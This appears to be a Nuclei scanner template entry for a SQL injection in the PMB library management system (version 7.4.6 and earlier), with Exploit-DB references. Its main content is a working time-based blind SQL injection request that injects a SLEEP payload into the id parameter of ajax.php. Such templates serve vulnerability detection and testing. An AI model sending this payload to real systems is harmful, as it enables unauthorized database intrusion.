# Nuclei Template: PMB <= 7.4.6 - SQL Injection
**Template ID:** pmb-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**CWE:** CWE-89
**Source:** Nuclei Template (`pmb-sqli.yaml`)

## Vulnerability Information & PoC

## Description
PMB is a completely free ILS (Integrated Library management System). The domain of software for libraries is almost exclusively occupied by proprietary products. We are some librarians, users and developers deploring this state of affairs.

## Steps to reproduce / Exploit Payload
```http
@timeout: 15s
GET /pmb/opac_css/ajax.php?categ=storage&datetime=undefined&id=1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(7)))SHde)&module=ajax&sub=save&token=undefined HTTP/1.1
Host: {{Hostname}}
```

## References
- https://www.exploit-db.com/exploits/51197
- https://vulners.com/exploitdb/EDB-ID:51197
